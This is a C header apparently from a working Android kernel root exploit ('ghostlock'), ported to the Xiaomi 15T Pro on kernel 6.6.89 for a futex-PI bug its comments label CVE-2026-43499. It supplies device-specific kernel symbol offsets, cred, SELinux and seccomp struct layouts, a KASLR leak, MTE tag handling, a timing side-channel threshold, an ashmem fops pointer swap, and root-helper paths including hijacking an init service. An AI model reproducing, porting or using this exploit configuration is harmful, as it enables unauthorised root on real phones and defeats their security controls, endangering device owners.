#ifndef TARGET_H
#define TARGET_H

/* Xiaomi klimt (15T Pro, 2506BPN68R) — HyperOS OS3.0.301.0.WOSJPXM, MT6991 / Dimensity 9400
 *
 *   kernel 6.6.89-android15-8-g0889fe95bb10-ab14402178-4k  (GKI, 4K pages)
 *   build  Xiaomi/klimt_jp/klimt:16/BP2A.250605.031.A3/OS3.0.301.0.WOSJPXM:user/release-keys
 *
 * Build with:  make TARGET=klimt/jp/6.6.89-android15-8-g0889fe95bb10-ab14402178-4k CORE=core66
 *
 * Everything here was derived from the stock boot.img by
 *   python3 tools/extract_device.py boot.img --name klimt
 * (pmg110-root's copy of it), except P0_KERNEL_PHYS_LOAD, which comes from the
 * preloader, and CONFIGFS_READ_ITER_OFF, which that extractor names wrongly —
 * both noted where they appear below.
 *
 * The futex-PI bug is present in this build. remove_waiter() is out-of-line at
 * image offset 0x01055d44 and operates on `current` (mrs x20, sp_el0; then
 * `add x21, x20, #0x90c` for pi_lock) rather than on waiter->task, and
 * rt_mutex_start_proxy_lock+0x44 calls it on the failure path. That is the
 * unfixed shape of CVE-2026-43499; the stable fix first shipped in 6.6.140 and
 * this kernel is 6.6.89. The same disassembly re-confirms FAKE_TASK_PI_LOCK_OFF
 * (0x90c) below.
 *
 * This target's kernel is a different sublevel from pmg110's (6.6.89 against
 * 6.6.118) but the same GKI branch, and every struct offset in this header was
 * derived from klimt's own image rather than carried over — a re-extraction of
 * both agrees on all 57 of them. The values that are *not* klimt's own
 * measurement are marked "inherited" where they appear.
 *
 * Why this file exists at all: only main.c re-points the *_OFF macros at the
 * runtime known_offsets[] table. fops.c, root.c, util.c, pipe.c and slide.c
 * use the compile-time values from here, so a device on a different kernel
 * series needs its own target.h, not just an offsets.h entry.
 */

#define BUILD_VARIANT_LABEL "ghostlock_klimt"
#define BUILD_FINGERPRINT "xiaomi/klimt"
/* Struct-layout identity of this header; must match the .layout of whichever
 * offsets.h entry the running kernel selects. See core66/offsets.h. */
#define TARGET_LAYOUT_ID "klimt-6.6"

/* ---------------------------------------------------------------- memory ---
 * VA_BITS=39 — confirmed by CONFIG_ARM64_VA_BITS=39 in the image's embedded
 * .config and by _text = 0xffffffc080000000 in its kallsyms.
 */
#define KIMAGE_TEXT_BASE 0xffffffc080000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL

/* DRAM base. Every region in the preloader's memory-layout table sits at or
 * above 0x80000000 and mb_kernel starts exactly there. */
#define P0_PHYS_OFFSET 0x80000000ULL

/* Physical address the bootloader loads the kernel Image at.
 *
 * MT6991 lk does not carry this as a compiled-in constant — it takes the
 * address from the mblock allocator, which lk populates from the memory map
 * the preloader hands over in the PL2LK boot tag. So it is not in lk.img and
 * not in boot.img. It *is* in the preloader:
 *
 *     python3 tools/preloader_memlayout.py preloader_klimt.bin
 *     mb_kernel  0x0080000000  size 0x07c80000  align 0x10000
 *
 * (pmg110-root's tools/preloader_memlayout.py, run on klimt's own stock
 * preloader — 12 entries, table found by scan at file 0xe1208.)
 *
 * It lands exactly on the DRAM base, i.e. P0_KERNEL_PHYS_DELTA == 0, which is
 * what the other MT6991 target in this repository measured as well. That
 * agreement is a property of the SoC's memory-layout config rather than
 * evidence about this build, so it is stated, not leaned on.
 *
 * arm64's linear-map randomisation never fires at VA_BITS=39, so memstart_addr
 * stays at the DRAM base and the physmap alias is KASLR-independent. Checked
 * on this image rather than assumed: tools/qemu_verify.py --mode linear boots
 * it five times across KASLR seeds, RAM sizes and CPU models and memstart_addr
 * is the DRAM base every time. That settles the *alias*; the load address
 * itself is still the preloader's number above.
 *
 * To check it against a running device, or to override without a rebuild:
 *     adb shell su -c 'grep -i "Kernel code" /proc/iomem'
 *     GHOSTLOCK_PHYS_LOAD=0x... <payload>
 */
#ifndef P0_KERNEL_PHYS_LOAD
#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
#endif

/* Conservative bounds, not measured spans. The linear map for VA_BITS=39 runs
 * to 0xffffffc000000000; MT6991 DRAM is contiguous from P0_PHYS_OFFSET, so any
 * shipping RAM size falls well inside these. Widening only costs scan time. */
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END   0xffffff8c00000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

/* ------------------------------------------- KernelSnitch geometry ---------
 * These describe kernel-side allocator and hash-table shapes, so they belong
 * to a kernel build the same way the struct offsets do.
 *
 * MM_STRUCT_SZ is the mm_cachep object size, not sizeof(struct mm_struct).
 * mm_cache_init() asks for
 *     sizeof(struct mm_struct) + cpumask_size() + mm_cid_size()
 * with SLAB_HWCACHE_ALIGN. Here: BTF says sizeof = 1216 (0x4c0), the embedded
 * .config has CONFIG_NR_CPUS=32 with neither CONFIG_CPUMASK_OFFSTACK nor
 * CONFIG_SCHED_MM_CID set, so cpumask_size() = 8 and mm_cid_size() = 0, and
 * rounding 1224 up to the 64-byte cache line gives 1280. The scan enumerates
 * candidates as slab_base + k*MM_STRUCT_SZ, so a wrong value here means it
 * steps straight past the real object. */
#define MM_STRUCT_SZ 0x500
#define MM_ORDER 3

/* futex_init(): roundup_pow_of_two(256 * num_possible_cpus()).
 * futex_hash() masks with (futex_hashsize - 1), so this MUST be a power of
 * two. /sys/devices/system/cpu/possible reads 0-7 on this device, so 8
 * possible CPUs and 2048. */
#define FUTEX_HASHSIZE 2048

/* ------------------------------------------------------------ kernel MTE ---
 * Kernel heap pointers carry a tag in bits [59:56] when KASAN_HW_TAGS is
 * active. This kernel has CONFIG_KASAN_HW_TAGS=y and CONFIG_ARM64_MTE=y
 * compiled in, and the unit this port was brought up on *boots* with them on:
 * /proc/cmdline carries kasan.* options, AT_HWCAP2 has HWCAP2_MTE, and an
 * untagged sweep fails the mm_struct leak every time while a tagged one finds
 * it on the first attempt.
 *
 * That is a fact about a boot, not about this firmware. A klimt can come up
 * either way, so this header refuses to answer and mte.c answers per boot --
 * KS_MTE_PER_BOOT, the same shape warhol's core612 header uses and for the
 * same reason. Pinning it would be wrong in both directions: pinned to 0 on a
 * tagging boot nothing is ever found, and pinned to 1 on a non-tagging boot
 * the sweep tries 15 tags that cannot be there, which multiplies the chance a
 * wrong (address, tag) pair satisfies the collision constraints -- and a wrong
 * base is a wild write, not a retry. GHOSTLOCK_MTE=0/1 still forces it. */
#define KS_MTE_PER_BOOT 1

/* The other two places a kernel pointer is read or built are *not* per-boot,
 * because each is correct either way rather than merely tolerable:
 *
 * The perf register vote that finds the child's task_struct. Upstream's filter
 * compares raw values against PAGE_OFFSET and so discards a tagged `current`;
 * this one untags first, keeps the tag, and bounds the result to the linear
 * map and to the task_struct cache's alignment. On a kernel that tags nothing
 * the untag is the identity and the two extra bounds still hold -- they reject
 * the vmalloc stack addresses upstream let through, which is an improvement
 * there too. /sys/kernel/slab/task_struct reports object_size 4800, order 3,
 * align 64. See PERF_FIND_TASK_TAGGED in core66/main.c. */
#define PERF_FIND_TASK_TAGGED 1
#define PERF_FIND_TASK_ALIGN 64

/* And the reclaimed kernel page, whose base comes out of the leak carrying the
 * mm_struct slab's tag -- stale by the time the page is skb data. Forcing tag
 * 0xf fixes that where the kernel tags, and is a no-op where it does not: an
 * untagged linear-map address already has 0xf in bits [59:56], so the OR
 * changes nothing. 0xf is match-all here -- __cpu_setup builds
 * TCR_EL1 = 0x0450_0070_b559_3519, bit 58 = TCMA1. See prepare_kernel_page(). */
#define PAGE_PTR_MATCH_ALL_TAG 1

/* Collision threshold for KernelSnitch's timing side channel: a futex whose
 * hash-bucket walk takes more than this many times an empty bucket counts as
 * a collision. A property of the SoC's memory system, not of the kernel, and
 * this is the same SoC (MT6991) the other target in this repository measured
 * it on with a wide margin. Sweep with GHOSTLOCK_KS_THRESHOLD if a run shows
 * accepted times near the threshold. */
#define KERNELSNITCH_THRESHOLD_MULT 10

/* ------------------------------------------- global symbols (kallsyms) --- */
#define INIT_TASK_OFF          0x020fe280ULL
#define INIT_CRED_OFF          0x02110548ULL
#define INIT_UTS_NS_OFF        0x02282190ULL
#define EMPTY_ZERO_PAGE_OFF    0x022ed000ULL
#define ROOT_TASK_GROUP_OFF    0x022f5580ULL
#define SELINUX_ENFORCING_OFF  0x02336ea0ULL
#define KPTR_RESTRICT_OFF      0x020fbd20ULL
/* no security_hook_active_capable_* symbol on this 6.6 build */
#define CAP_CAPABLE_ACTIVE_OFF 0ULL
#define KPTR_RESTRICT          (KIMAGE_TEXT_BASE + KPTR_RESTRICT_OFF)
#define SELINUX_BLOB_SIZES_OFF 0x016625f0ULL
#define SECURITY_HOOK_HEADS_OFF 0x01661eb8ULL
#define KMALLOC_CACHES_OFF     0x016619f8ULL
#define ANON_PIPE_BUF_OPS_OFF  0x0115ba08ULL
/* The *plain* configfs_read_iter, not configfs_bin_read_iter. The read
 * primitive plants buffer->page and clears needs_read_fill, which is the plain
 * one's contract; the bin one copies from bin_buffer/bin_buffer_size, which
 * that blob leaves at zero, and reaches to_frag(file) unconditionally at +0x3c
 * -- above its own mutex_lock -- through a dentry whose d_fsdata is a tmpfs
 * directory index rather than a configfs_dirent.
 *
 * Which symbol is which was read out of this image's own tables:
 *
 *   configfs_file_operations     @ image 0x1166b80  read_iter 0x0048bd58
 *   configfs_bin_file_operations @ image 0x1166c88  read_iter 0x0048c07c
 *
 * This is the one value here that a fresh extraction disagrees with, and the
 * disagreement is the extractor's: pmg110-root's tools/extract_device.py maps
 * this field to the symbol named configfs_bin_read_iter, so it prints
 * 0x0048c07c. Re-derive the rest of this header from the image freely, but do
 * not take this one from it. The other MT6991 target here reached the same
 * conclusion the expensive way -- a run with the bin symbol panicked in
 * configfs_bin_read_iter+0x3c, to the byte. */
#define CONFIGFS_READ_ITER_OFF      0x0048bd58ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x0048c284ULL
#define COPY_SPLICE_READ_OFF   0x00410578ULL
#define NOOP_LLSEEK_OFF        0x003c3318ULL
/* C ashmem (drivers/staging/android/ashmem.c), not the Rust driver.
 * ASHMEM_MISC_FOPS is the fops *pointer slot* the exploit swaps, i.e.
 * &ashmem_misc.fops == ashmem_misc + offsetof(struct miscdevice, fops):
 * ashmem_misc is at 0x0225b3d8 and that slot holds ASHMEM_FOPS_OFF. */
#define ASHMEM_MISC_FOPS_OFF   0x0225b3e8ULL
#define ASHMEM_FOPS_OFF        0x012dbe18ULL
#define ASHMEM_IOCTL_OFF       0x00c7f65cULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x00c7fd18ULL
#define ASHMEM_MMAP_OFF        0x00c7fd6cULL
#define ASHMEM_OPEN_OFF        0x00c7ff8cULL
#define ASHMEM_RELEASE_OFF     0x00c80014ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x00c800a0ULL

/* KASLR leak. nfulnl_logger is a symbol here; loggers is at 0x020f21a0 and the
 * slot read is loggers[0][1] at +0x10. random_boot_id_data has no symbol on
 * this build -- sysctl_bootid is the one that exists, and both fields take it,
 * which is what the other 6.6 target does as well. */
#define SLIDE_NFULNL_LOGGER_OFF       0x020f2258ULL
#define SLIDE_LOGGERS_0_1_OFF         0x020f21b0ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02357e98ULL
#define SLIDE_SYSCTL_BOOTID_OFF       0x02357e98ULL

/* Derived macros */
#define INIT_TASK           (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_CRED           (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
#define INIT_UTS_NS         (KIMAGE_TEXT_BASE + INIT_UTS_NS_OFF)
#define EMPTY_ZERO_PAGE     (KIMAGE_TEXT_BASE + EMPTY_ZERO_PAGE_OFF)
#define ROOT_TASK_GROUP     (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING   (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SELINUX_BLOB_SIZES  (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES      (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS   (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define ASHMEM_MISC_FOPS    (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS         (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL        (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP         (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN         (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE      (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO  (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER      (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ    (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK         (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define SLIDE_NFULNL_LOGGER_IMAGE       (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE         (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE           (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE     (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE       (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* ---------------------------------------------------- pselect overlay ------
 * Computed statically from the two call chains' prologues, which is how a port
 * can be scoped before booting anything:
 *
 *   __arm64_sys_futex      frame 0x70   do_futex              frame 0x60
 *   __arm64_sys_pselect6   frame 0x90   do_pselect            frame 0x00
 *   futex_wait_requeue_pi  frame 0x1c0, rt_waiter   at sp+0x90
 *   core_sys_select        frame 0x1f0, stack_fds   at sp+0x80
 *
 *   entry SP difference = (0x90) - (0x70 + 0x60) = -64
 *   waiter word         = 0            (need -2 <= word <= 3)
 *
 * The freed waiter lands on stack_fds[0], so the overlay is feasible. Both
 * routes call libc select(), which on arm64 is the pselect6 syscall (arm64 has
 * no __NR_select), so pselect6 is the right chain for both.
 *
 * QEMU then measured the same thing on this image -- tools/qemu_verify.py
 * --mode stack boots it under -M virt and breaks on both syscall entries from
 * one task -- and agreed with the computation rather than merely being
 * consistent with it:
 *
 *   entry SP core_sys_select       = 0xffffffc08000bd90  frame 0x1f0
 *   entry SP futex_wait_requeue_pi = 0xffffffc08000bd50  frame 0x1c0
 *   same kernel stack, measured entry-SP delta = -64
 *   rt_waiter == stack_fds == 0xffffffc08000bc20  ->  waiter word 0
 *
 * fops.c's words[] is written for a waiter at word 2  -> shift = 0 - 2 = -2
 * slide.c's words[] indexes the waiter from word 0    -> shift = 0
 */
#define PSELECT_WAITER_WORD_SHIFT -2
#define SLIDE_PSELECT_WORD_SHIFT 0
#define SLIDE_PSELECT_NFDS 320
#define SLIDE_USE_SELECT 1

/* ------------------------------------------- struct fields (BTF verified) --
 * Read from this kernel's own BTF. These are 6.6 layouts and differ from the
 * 6.12 layouts core612 carries -- notably file_operations, which gained
 * fop_flags after `owner` in 6.12 and shifted llseek..mmap by 8.
 */
/* rt_mutex_waiter — sizeof = 0x70 */
#define WAITER_LOCAL_OFF          0x80
#define WAITER_TREE_ENTRY_OFF     0x00
#define WAITER_PI_TREE_ENTRY_OFF  0x28
#define WAITER_TASK_OFF           0x50
#define WAITER_LOCK_OFF           0x58
#define WAITER_WAKE_STATE_OFF     0x60
#define WAITER_PRIO_OFF           0x18
#define WAITER_DEADLINE_OFF       0x20
#define WAITER_WW_CTX_OFF         0x68

#define FAKE_WAITER_TREE_PRIO_OFF         0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF     0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF     0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF      0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF  0x48
#define FAKE_WAITER_TASK_OFF              0x50
#define FAKE_WAITER_LOCK_OFF              0x58
#define FAKE_WAITER_WAKE_STATE_OFF        0x60
#define FAKE_WAITER_WW_CTX_OFF            0x68

/* task_struct — sizeof = 0x12c0 */
#define FAKE_TASK_USAGE_OFF          0x40
#define FAKE_TASK_PRIO_OFF           0x84
#define FAKE_TASK_NORMAL_PRIO_OFF    0x8c
#define FAKE_TASK_TASK_GROUP_OFF     0x348
#define FAKE_TASK_PI_LOCK_OFF        0x90c
#define FAKE_TASK_PI_WAITERS_OFF     0x920
#define FAKE_TASK_PI_TOP_TASK_OFF    0x930
#define FAKE_TASK_PI_BLOCKED_ON_OFF  0x938

/* mm_struct.owner sits in an anonymous struct, which the BTF reader here
 * cannot address; this is inherited from the other 6.6 target rather than
 * measured on klimt. Nothing in the exploit reads it. */
#define MM_OWNER_OFF             0x2b0
#define TASK_PID_OFF             0x618
#define TASK_TGID_OFF            0x61c
#define TASK_REAL_PARENT_OFF     0x628
#define TASK_ATOMIC_FLAGS_OFF    0x5d8
#define TASK_REAL_CRED_OFF       0x818
#define TASK_CRED_OFF            0x820
#define TASK_COMM_OFF            0x830
#define TASK_TASKS_OFF           0x550
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#define TASK_SECCOMP_OFF         0x8e8

/* cred — sizeof = 0xb8 */
#define CRED_UID_OFF         8
#define CRED_SECUREBITS_OFF  40
#define CRED_CAPS_OFF        48
#define CRED_SECURITY_OFF    128
#define SELINUX_CRED_BLOB_OFF  0
#define SELINUX_CRED_OSID_OFF  0
#define SELINUX_CRED_SID_OFF   4
#define SECCOMP_MODE_OFF          0x00
#define SECCOMP_FILTER_COUNT_OFF  0x04
#define SECCOMP_FILTER_OFF        0x08
#define TIF_SECCOMP_BIT           11
#define PFA_NO_NEW_PRIVS_BIT      0

/* struct page: flags at 0, the big union at 0x08 (compound_head is its first
 * tail-page member), the 4-byte _mapcount/page_type union at 0x30 — pinned by
 * BTF reporting _refcount at 0x34 and sizeof(page) = 0x40. struct slab agrees:
 * slab_cache at 0x08, sizeof 0x40. */
#define STRUCT_PAGE_SIZE              0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF         0x08
#define STRUCT_PAGE_TYPE_OFF          0x30

/* pipe_inode_info — sizeof = 0xb8 */
#define PIPE_BUFFER_SIZE         0x28
#define PIPE_BUFFER_SLOTS        32
#define PIPE_BUF_FLAG_CAN_MERGE  0x10
#define PIPE_INODE_INFO_STRUCT_SIZE   0xb8
#define PIPE_INODE_INFO_SIZE          0xc0
#define PIPE_INODE_INFO_SLOTS_PER_PAGE 21
#define PIPE_HEAD_OFF                 0x60
#define PIPE_TAIL_OFF                 0x64
#define PIPE_MAX_USAGE_OFF            0x68
#define PIPE_RING_SIZE_OFF            0x6c
#define PIPE_NR_ACCOUNTED_OFF         0x70
#define PIPE_READERS_OFF              0x74
#define PIPE_WRITERS_OFF              0x78
#define PIPE_FILES_OFF                0x7c
#define PIPE_TMP_PAGE_OFF             0x90
#define PIPE_BUFS_OFF                 0xa8
#define PIPE_USER_OFF                 0xb0

/* file_operations — sizeof = 0x108 (6.6: no fop_flags) */
#define FOPS_OWNER_OFF        0x00
#define FOPS_LLSEEK_OFF       0x08
#define FOPS_READ_OFF         0x10
#define FOPS_WRITE_OFF        0x18
#define FOPS_READ_ITER_OFF    0x20
#define FOPS_WRITE_ITER_OFF   0x28
#define FOPS_IOCTL_OFF        0x48
#define FOPS_COMPAT_IOCTL_OFF 0x50
#define FOPS_MMAP_OFF         0x58
#define FOPS_OPEN_OFF         0x68
#define FOPS_RELEASE_OFF      0x78
#define FOPS_SPLICE_READ_OFF  0xb8
#define FOPS_SHOW_FDINFO_OFF  0xd8

/* Exploit-internal payload page layout (not kernel dependent) */
#define LOCK_OFF      0x0E80
#define W0_OFF        0x1180
#define FOPS_OFF      0x0F80
#define SCRATCH_OFF   0x1200
#define RIGHT_OFF     0x1240
#define LEFT_OFF      0x1260
#define FAKE_TASK_OFF 0x1280
/* struct configfs_buffer, which *is* kernel dependent — BTF on this image:
 * sizeof 128, page 16, needs_read_fill 80, bin_buffer 88, bin_buffer_size 96,
 * cb_max_size 100. */
#define CFG_PAGE_OFF            16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF      88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF     100

/* Write 2 specific */
#define CRED_COPY_OFF 0x1080


/* Where the bootstrap helper is staged for an adb-shell run. The application
 * passes its own copy down instead, through CVE43499_ROOT_HELPER, because the
 * APK's copy is at a path that is neither fixed nor writable from here. This
 * is the route run_exploit() takes: its credential write roots a forked child,
 * and that child execs the helper itself.
 *
 * From an application that child carries the app's seccomp filter, so
 * root_helper.c has init exec the helper instead, over one service's argv. Its
 * INIT_HIJACK_* defaults are what this device ships -- read off the device's
 * own /system/etc/init/snapuserd.rc, not assumed from the static assert, which
 * only says the defaults are self-consistent:
 *
 *     service snapuserd_proxy /system/bin/snapuserd -socket-handoff
 *         oneshot / disabled / user root / seclabel u:r:snapuserd:s0
 *
 * so this target needs no INIT_HIJACK_* of its own. Nothing has exercised that
 * route here -- an adb-shell run does not reach it. */
#define ROOT_HELPER_PATH "/data/local/tmp/cve-2026-43499-root"

/* usermodehelper root route -- only the fops/pipe route reaches it, which
 * run_exploit() does not use on this core. Note that this build has
 * CONFIG_STATIC_USERMODEHELPER=y with CONFIG_STATIC_USERMODEHELPER_PATH="",
 * so call_usermodehelper is disabled outright here and this route cannot
 * work on klimt even if something did reach it. */
#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000cfa4cULL
#define SYSTEM_UNBOUND_WQ_OFF 0x020eae60ULL
#define CALL_USERMODEHELPER_EXEC_WORK \
  (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200
/* workqueue_struct / pool_workqueue / worker_pool / work_struct, from this
 * image's BTF: sizeof 0x140 / 0x200 / 0x360 / 0x30. */
#define WQ_DFL_PWQ_OFF 0xb0
#define PWQ_POOL_OFF 0x00
#define PWQ_WQ_OFF 0x08
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF 0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF 0x5c
#define PWQ_MAX_ACTIVE_OFF 0x60
#define POOL_WORKLIST_OFF 0x28
#define POOL_NR_IDLE_OFF 0x3c
#define WORK_DATA_OFF 0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF 0x18

#endif /* TARGET_H */
